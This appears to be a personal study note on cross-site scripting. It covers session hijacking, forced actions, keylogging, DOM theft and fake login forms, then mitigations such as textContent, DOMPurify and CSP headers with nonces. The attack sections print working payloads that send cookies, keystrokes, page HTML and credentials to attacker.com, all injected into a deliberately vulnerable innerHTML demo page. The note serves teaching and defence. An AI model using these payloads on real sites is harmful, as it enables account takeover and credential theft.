
![[Pasted image 20251204122445.png]]

Cross-Site Scripting (XSS) is a **security vulnerability** where an attacker is able to inject and execute **malicious scripts** inside a trusted web application.  
These scripts run in the victim’s browser and can access anything that the legitimate page can access.

---
## What Attackers Can Steal
If an XSS attack succeeds, the attacker’s script can read sensitive data exposed by the webpage, such as:

- Cookies (including session cookies)
- Session data
- User information displayed on the page
- Potentially sensitive items like account balances or private UI data

Because the script executes **as if it came from your website**, the browser fully trusts it.

---
## How Attackers Inject Scripts
An attacker can inject malicious code in many places, including:

- URL parameters  
- User input fields  
- Form submissions  
- Comment sections / textboxes  
- Any data that is rendered back into HTML without proper sanitization

If the application displays or uses this unvalidated input in a way you did **not intend**, it results in XSS.

___
## XSS Vulnerabilities

When an attacker successfully injects a script into your application, it can lead to several serious security issues:

### 1. User Session Hijacking
If the script accesses cookies or session tokens, the attacker can impersonate the user.  
This allows them to log in as the victim and perform actions on their behalf.

### 2. Unauthorized Activities
Malicious scripts can trigger actions without the user’s knowledge.  
Example: sending messages, posting content, or performing transactions (e.g., sending Instagram DMs asking for money).

### 3. Keystroke Capture (Keylogging)
Injected scripts can monitor keyboard input.  
Anything typed—passwords, credit card numbers, search queries—can be sent to the attacker.

### 4. Stealing Critical Information (DOM Access)
The script can read and extract sensitive information directly from the DOM, including:
- Account details shown on the page  
- Hidden fields  
- Internal state that should not be exposed  

### 5. Phishing via Fake UI Elements
Attackers can inject fake forms, pop-ups, or UI components that look legitimate.  
Users unknowingly enter sensitive information, which is then captured by the attacker.

## 6. Attacker can make use of eval
Never use eval in the code whenever we are accepting user input.

## Example of an XSS Vulnerability

Consider the following vulnerable HTML code:

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>XSS Example</title>
</head>
<body>
  <!-- Vulnerable Code -->
  <div>Welcome, <span id="username"></span>!</div>

  <script>
    // Function to set a cookie (normally set by the server)
    function setCookie(name, value, days) {
      const date = new Date();
      date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000);
      const expires = "expires=" + date.toUTCString();
      document.cookie = name + "=" + value + ";" + expires + ";path=/";
    }

    // Example cookie for demonstration
    setCookie("exampleCookie", "Hello, Cookie!", 7);
  </script>

  <!-- Actual vulnerable part -->
  <script>
    const params = new URLSearchParams(window.location.search);
    const name = params.get("name");

    // ❌ Vulnerable: Directly injecting user input into HTML
    document.getElementById("username").innerHTML = name;
  </script>
</body>
</html>
```

---
### Why This Is Vulnerable

The app reads the `name` parameter from the URL and inserts it directly into the DOM using:

```js
document.getElementById("username").innerHTML = name;
```

Since `innerHTML` interprets the input as HTML, an attacker can inject malicious code in the URL.

---
### Example Attack Payload

An attacker can send a link like:

```
https://your-site.com/?name=<img src="https://attacker.com/steal?cookie=" + document.cookie >
```

Or more commonly:

```
https://your-site.com/?name=<script>fetch("https://attacker.com/steal?c=" + document.cookie)</script>
```

When the victim opens this link:

- The malicious HTML/script runs inside your page.
- The attacker’s script reads **document.cookie**.
- It sends the cookie to the attacker’s server.
- The attacker can now hijack the user’s session.

---
### Summary

The vulnerability exists because:

- **Untrusted user input** is placed into the DOM.
- **innerHTML** executes HTML and scripts.
- Attackers can craft URLs that inject script tags or image tags with malicious sources.

We will fix this later when we discuss **mitigations** such as sanitization, escaping, and safer DOM APIs.


# Unauthorized Activities Attack — Full Explanation With Code + Why It Works

Below is the vulnerable example where an attacker can force the user's browser to perform actions (like creating a post) **without needing to steal cookies**.

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>XSS Example</title>
  </head>
  <body>
    <div>
      Welcome, <span id="username"></span>! TimeZone,
      <span id="timezone"></span>!
    </div>

    <script>
      // Simple cookie-setting function (usually set by server)
      function setCookie(name, value, days) {
        const date = new Date();
        date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000);
        const expires = "expires=" + date.toUTCString();
        document.cookie = name + "=" + value + ";" + expires + ";path=/";
      }

      setCookie("exampleCookie", "Hello, Cookie!", 7);
    </script>

    <!-- Vulnerable: injecting user-controlled input into the DOM -->
    <script>
      const params = new URLSearchParams(window.location.search);
      const name = params.get("name");
      document.getElementById("username").innerHTML = name;
    </script>

    <!-- Sensitive function exposed globally -->
    <script>
      function createPost(title, description) {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "/post", true);
        xhr.withCredentials = true; // cookies automatically included

        xhr.setRequestHeader(
          "Content-type",
          "application/x-www-form-urlencoded"
        );

        xhr.send(`txtName=${title}&mtxMessage=${description}`);
      }
    </script>
  </body>
</html>
```

---

## How an Attacker Exploits This

The attacker sends a malicious link like:

```
https://your-site.com/?name=<img src=x onerror="createPost('Hacked','Attacker posted this!')">
```

- The `<img>` fails to load → `onerror` fires  
- `createPost()` is called **as the logged-in user**  
- The victim unknowingly creates a post

---

# Does the Unauthorized Activities Attack Require Cookie Theft?

**No — the attacker does *not* need to steal cookies.**

### Why?

The malicious script runs **inside the victim’s browser**, on your domain.

Because of that:

- The browser automatically attaches cookies  
- The attacker’s script executes with the victim’s permissions  
- The attacker never needs to see the cookie at all  

When the attacker triggers:

```js
createPost("Hacked", "Attacker posted this!");
```

The browser sends:

- Session cookie  
- Authentication data  
- Permissions of that logged-in user  

The attacker simply makes the victim’s browser perform the action.

---

## When *Is* Cookie Theft Required?

Cookie theft is needed only if the attacker wants to:

- Log in as the user **from their own machine**
- Actually take over the session outside the victim's browser

Unauthorized activity attacks do **not** require this.

---

# Why This Works

Because the browser thinks:

> “This script is coming from example.com, so it must be trusted.”

The attacker just needs to place the malicious payload in:

- A URL parameter  
- A form field  
- Stored content (comments, profile fields)  
- Any location your site outputs to the DOM  
- Anything you insert using `innerHTML`  

Then attacker sends the link to you, you click it and then -

- Your vulnerable code places the attacker’s content into the DOM  
- The browser executes the script **as if your server wrote it**  
- Cookies and authentication are automatically included  
- The attacker gains the ability to perform actions as the victim  

> **Your vulnerable code does the rest.**

![[Pasted image 20251206144512.png]]


## 6/12/2025 Capturing Keystrokes

## XSS Vulnerability 3 — Keystroke Capturing (Keylogging)

This vulnerability allows an attacker to capture everything the user types on the keyboard and send it to the attacker's server — all without the user knowing.

### Vulnerable Example

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSS Example</title>
</head>
<body>

<div>
    Welcome, <span id="username"></span>!
</div>

<script>
    function setCookie(name, value, days) {
        const date = new Date();
        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
        const expires = "expires=" + date.toUTCString();
        document.cookie = name + "=" + value + ";" + expires + ";path=/";
    }

    setCookie("exampleCookie", "Hello, Cookie!", 7);
</script>

<!-- Vulnerable Code -->
<script>
    const params = new URLSearchParams(window.location.search);
    const name = params.get('name');
    document.getElementById('username').innerHTML = name;
</script>

</body>
</html>
```

This line is the vulnerability:

```js
document.getElementById('username').innerHTML = name;
```

If the attacker injects JavaScript using the `name` parameter, they can insert a **keylogging script** into your page.

---

## How the Attacker Injects the Keylogger

The attacker crafts a malicious URL:

```
https://your-site.com/?name=<script>ATTACKER_CODE_HERE</script>

OR something like the below code

<img src="x" onerror="ATTACKER_CODE_HERE">
```

Inside the payload, the attacker includes JavaScript like this:

```js
var timeout;
var buffer = '';

document.querySelector('body').addEventListener('keypress', function(event) {
    if (event.which !== 0) {
        clearTimeout(timeout);
        buffer += String.fromCharCode(event.which);

        timeout = setTimeout(function() {
            var xhr = new XMLHttpRequest();
            var uri = 'https://attacker.com/keys?data=' + encodeURIComponent(buffer);
            xhr.open('GET', uri, true);
            xhr.send();
            buffer = '';
        }, 400);
    }
});
```

### What This Code Does

- Listens for every `keypress` event on the page.
- Converts keystrokes into characters and stores them in a buffer.
- Every **400 ms**, it sends the captured keystrokes to the attacker's server.
- The user does **not** see anything unusual happening.

---

## Why This Is Dangerous

Using this vulnerability, an attacker can capture:

- Passwords  
- Credit card numbers  
- Personal messages  
- Search queries  
- Anything typed into input fields  

All of this gets sent silently to the attacker's endpoint using `XMLHttpRequest` or `fetch`.

---

## Summary

Keystroke capturing occurs because:

- User input (`name` parameter) is inserted into the DOM unsafely using `innerHTML`.
- The attacker can inject JavaScript that adds a global keypress listener.
- The script periodically sends keystrokes to the attacker’s server.

This is the **third major type of XSS exploitation**, after:

1. Session hijacking  
2. Unauthorized actions  
3. **Keystroke logging** (this example)

Mitigations will be discussed later.

## XSS Vulnerability 4 — Stealing Critical Information (DOM Theft)

In this attack, the attacker uses XSS to steal **the entire DOM content** of the page.  
Whatever the user sees — account details, balances, emails, personal data, hidden form fields — can be extracted and sent to the attacker.

This is extremely dangerous because:

- The attacker does **not** need backend access  
- They steal everything rendered on the screen  
- Sensitive data that should never leave the page is exposed  

---

## Example Payload

Attackers commonly use an `<img>` tag with an `onerror` handler to extract and exfiltrate the DOM:

```html
<img src="empty.gif" onerror="
    var mycookie = document.cookie;
    new Image().src = `https://example.com/fakepage.php?output=${document.body.innerHTML}`;
">
```

### What This Payload Does

1. `src="empty.gif"` fails → triggers `onerror`.
2. `mycookie = document.cookie` reads the user's session data.
3. `document.body.innerHTML` extracts **the full HTML content** of the page.
4. `new Image().src = 'https://attacker.com/...';`  
   silently sends the stolen data to the attacker's server via a GET request.

The user never sees anything happen because:

- No popup  
- No UI change  
- The request happens in the background using an invisible image request  

---

## Why This Is Dangerous

Using this technique, the attacker can steal:

- Bank account numbers displayed on the screen  
- Account balances  
- Email content  
- Passwords typed into fields (if also combined with keylogging)  
- Hidden fields (e.g., CSRF tokens, user IDs)  
- Any sensitive DOM data  

Anything rendered in the browser is **completely exposed**.

---

## Why It Works

This works because:

- The vulnerable site injects attacker-controlled HTML using `innerHTML`.
- The malicious `<img onerror>` executes as trusted JavaScript.
- The browser allows reading the DOM (`document.body.innerHTML`) because the script appears to originate from your domain.
- Data is exfiltrated using an image request, which avoids CORS and is invisible to users.

---

## Summary

DOM theft is the **fourth major XSS exploitation technique**, enabling attackers to steal everything on the page:

1. Session hijacking  
2. Unauthorized activities  
3. Keystroke capturing  
4. **Stealing the DOM / critical information**  

This is one of the most severe XSS outcomes because it exposes sensitive information without the user knowing.


### Why This Works

- The browser is the one making the request.
- The attacker’s domain receives the request normally.
- Since the HTML is placed in the URL query string (`?html=...`), the attacker’s server can read it directly.

### What the Attacker Can Extract

From the incoming GET request, the attacker can read:

- Full HTML content (`document.body.innerHTML`)
- Visible text (account numbers, balances, user details)
- Hidden form fields
- Email contents
- Embedded data
- Anything rendered in the DOM

This is why DOM theft is so powerful — **the attacker receives the exact DOM your browser sees**.

## XSS Vulnerability 5 — Fake UI / Phishing Attack (Fake Form Injection)

In this attack, the attacker injects a **fake login form** or other UI elements into the webpage using XSS.  
The user believes the form is legitimate and unknowingly enters sensitive information such as:

- Username  
- Password  
- Credit card number  
- OTP  
- Personal details  

The attacker then captures and sends this information to their server.

---

## How the Attack Works

The vulnerability is the same:

```js
document.getElementById("username").innerHTML = name;
```

If the attacker injects malicious HTML into the `name` parameter, the browser renders it as part of the page.

### Example Malicious Input (Delivered via URL parameter)

```html
<form action="https://attacker.com/steal" method="POST">
  <h3>Please re-login to continue</h3>
  <input type="text" name="user" placeholder="Username" />
  <input type="password" name="pass" placeholder="Password" />
  <button type="submit">Login</button>
</form>
```

The attacker adds this to the URL:

```
https://your-site.com/?name=<form action='https://attacker.com/steal' method='POST'><h3>Session expired. Please login again.</h3><input name='user'><input type='password' name='pass'><button>Login</button></form>
```

Your page then displays a **perfectly normal-looking form**, but it secretly submits data to the attacker.

---

## Why Users Fall for This

- The form appears **inside your trusted website**.
- The victim believes the site is asking them to log in again.
- No alerts, no pop-ups, nothing suspicious.
- The user enters credentials normally.
- The attacker receives them instantly.

---

## Example Attack Payload Using `<img onerror>`

Attackers prefer this method because it bypasses filters:

```html
<img src=x onerror="
document.body.innerHTML = `
  <h2>Your session expired. Please login again.</h2>
  <form action='https://attacker.com/capture' method='POST'>
    <input name='email' placeholder='Email'><br><br>
    <input type='password' name='password' placeholder='Password'><br><br>
    <button type='submit'>Login</button>
  </form>
`;
">
```

This replaces the **entire** page with the fake login UI.

---

## Why This Works

- XSS allows injecting arbitrary HTML into your DOM.
- Browsers happily render anything injected via `innerHTML`.
- Users trust the page and do not suspect the form is fake.
- The attacker completely controls where the form submits the data.
- The browser does **not** warn the user when submitting credentials to external domains.

---

## Summary

Fake UI phishing is the **5th major XSS exploitation technique**, where:

1. The attacker injects a fake form or UI element.  
2. The victim sees a legitimate-looking interface.  
3. The victim enters sensitive data.  
4. The attacker receives the credentials via form submission.

This method is extremely effective because it relies on **user trust**, not browser weaknesses.

![[Pasted image 20251206181016.png]]


# Mitigations 

# XSS Mitigation Strategies (Frontend Security)

When strengthening the frontend against XSS, the goal is to prevent untrusted user input from ever being interpreted as executable HTML or JavaScript.

Below are the core strategies:

---

## 1. List All Possible User Input Sources
Identify every place where your application accepts data:

- URL query parameters  
- Form inputs  
- Text fields  
- Query strings  
- Comments, chat messages, stored DB values  
- Cookies or local storage  
- Any dynamic content rendered into the DOM  

**If it comes from the user, treat it as untrusted.**

---

## 2. Avoid `innerHTML`
Do **not** use:

```js
element.innerHTML = userInput;
```

Because this executes HTML + JS directly.

Instead, use:

```js
element.innerText = userInput;
element.textContent = userInput;
```

This forces the browser to treat user input as **plain text**, not executable code.  
Tags like `<img>` or `<script>` become harmless text.

Modern frameworks & browsers heavily encourage this approach.

---

## 3. Sanitize / Escape User Input
Before inserting user-controlled data into the DOM, **escape dangerous characters**.

Example manual escaping:

```js
const sanitizedName = name
  .replace(/</g, '&lt;')
  .replace(/>/g, '&gt;');

document.getElementById('username').innerHTML = sanitizedName;
```

Better than nothing — but still error-prone for complex inputs.

---

## 4. Use Frameworks Like React / Vue / Angular
Modern UI libraries automatically protect you:

- They escape HTML by default  
- They do not interpret user input as JavaScript  
- They convert everything to safe text nodes  

Example:

```jsx
<div>{username}</div>
```

React will ensure this is **text**, not HTML or JS.

**Never** use:

```jsx
<div dangerouslySetInnerHTML={{ __html: userInput }} />
```

unless you have completely sanitized the input.

---

## 5. Use Sanitization Libraries (DOMPurify)
For maximum safety:

```js
const sanitizedName = DOMPurify.sanitize(name);
document.getElementById("username").textContent = sanitizedName;
```

DOMPurify:

- Removes malicious tags  
- Blocks event handlers  
- Prevents URL-based attacks  
- Cleans deeply nested HTML structures  

This is the recommended approach when you must allow some HTML (e.g., rich text editors).

---

## 6. Use Content Security Policy (CSP)
CSP adds an additional browser-enforced layer of protection.

Examples of protections:

- Blocks inline scripts  
- Blocks unauthorized script sources  
- Disallows `eval()` and dangerous constructs  
- Limits where images, styles, and scripts can load from  

You will explore CSP in detail next.

---

## Summary
To protect against XSS:

1. Identify all user inputs  
2. Avoid `innerHTML`  
3. Use `textContent` / `innerText`  
4. Sanitize inputs (manual escaping or DOMPurify)  
5. Use secure frontend frameworks  
6. Add CSP headers  
7. Avoid using eval() in your code

Together, these drastically reduce the attack surface for XSS.


# CSP (Content Security Policy) Headers

![[Pasted image 20251206182657.png]]

# Content Security Policy (CSP) — Practical Usage

CSP headers allow us to restrict which resources (scripts, images, styles, etc.) the browser is allowed to load or execute.  
They help prevent XSS by blocking anything that does not match the allowed rules.

---

## 1. Basic Express Server Without CSP

```js
const express = require("express");
const app = express();
const port = 3000;

app.use(express.static("public"));

app.get("/", (req, res) => {
  res.status(200).sendFile(`${__dirname}/public/index.html`);
});

app.listen(port, () => {
  console.log(`Listening on port ${port} ...`);
});
```

If you make a request to any external URL, the browser will normally allow it.

---

## 2. Adding a Simple CSP Header

```js
app.use((req, res, next) => {
  res.setHeader("Content-Security-Policy", "default-src 'self'");
  next();
});
```

### Effect:
- Only allow resources from **same origin**  
- Block scripts, images, styles, or AJAX requests from external domains  

This protects the page from loading malicious remote scripts.

---

## 3. Allowing Specific Script Sources

```js
app.use((req, res, next) => {
  res.setHeader(
    "Content-Security-Policy",
    "default-src 'self'; script-src 'self' https://dev-tinder-backend-r1ek.onrender.com/feed"
  );
  next();
});
```

### Effect:
- All scripts are blocked **except**:
  - Scripts served from your own domain
  - Scripts from `https://dev-tinder-backend-r1ek.onrender.com/feed`

This allows only trusted sources to run JavaScript.

---

# Script Nonces — Allowing Specific Inline Scripts

If CSP blocks inline scripts, you can use a **nonce** to trust only certain scripts.

### Example HTML:

```html
<h2>Page for CSP demo</h2>

<script src="https://dev-tinder-backend-r1ek.onrender.com/feed"></script>

<script nonce="random">
  console.log("My trusted script");
</script>

<script>
  console.log("My Untrusted script");
</script>
```

### Behavior:
- The inline script with `nonce="random"` executes  
- The untrusted inline script (without nonce) **does not execute**  

### Why?
Because the CSP header contains:

```js
app.use((req, res, next) => {
  res.setHeader(
    "Content-Security-Policy",
    "default-src 'self'; " +
      "script-src 'self' 'nonce-random' https://dev-tinder-backend-r1ek.onrender.com/feed"
  );
  next();
});
```

The browser only executes inline scripts that include the correct nonce:

```
nonce="random"
```

### Important Notes:
- Nonces **cannot be read** from DevTools ⇒ protects against attackers copying the nonce  
- Each request should have a **new random nonce** (but your example works for demos)

---

# Report-Only Mode (CSP Report Testing)

CSP has a mode called **Report-Only**, which checks CSP violations but does NOT block anything.

```
Content-Security-Policy-Report-Only: default-src 'self'; script-src 'self'
```

### What Happens in Report-Only Mode?

- The browser does **not block** unsafe scripts  
- But it **logs CSP violations**  
- These reports can be sent to your server for monitoring  

Example including a reporting endpoint:

```
Content-Security-Policy-Report-Only: default-src 'self'; report-uri https://yourserver.com/csp-report
```

### Use Cases:
- Safely test new CSP rules without breaking the site  
- Identify inline scripts or external scripts you forgot about  
- Slowly tighten security  
- Monitor potential XSS without disrupting users  

> Note: CSP reporting endpoints only work over **HTTPS** (for security reasons).

---

# Summary

- `default-src 'self'` → only allow resources from same origin  
- `script-src` → restrict where scripts can load from  
- **Nonces allow specific inline scripts** while blocking everything else  
- CSP **blocks malicious scripts** before they execute  
- Report-Only mode helps **test CSP rules safely**  
- Using nonce makes only the nonce-tagged script run, untrusted inline scripts get blocked  

CSP is a very powerful second layer of protection on top of sanitization and safe DOM APIs.

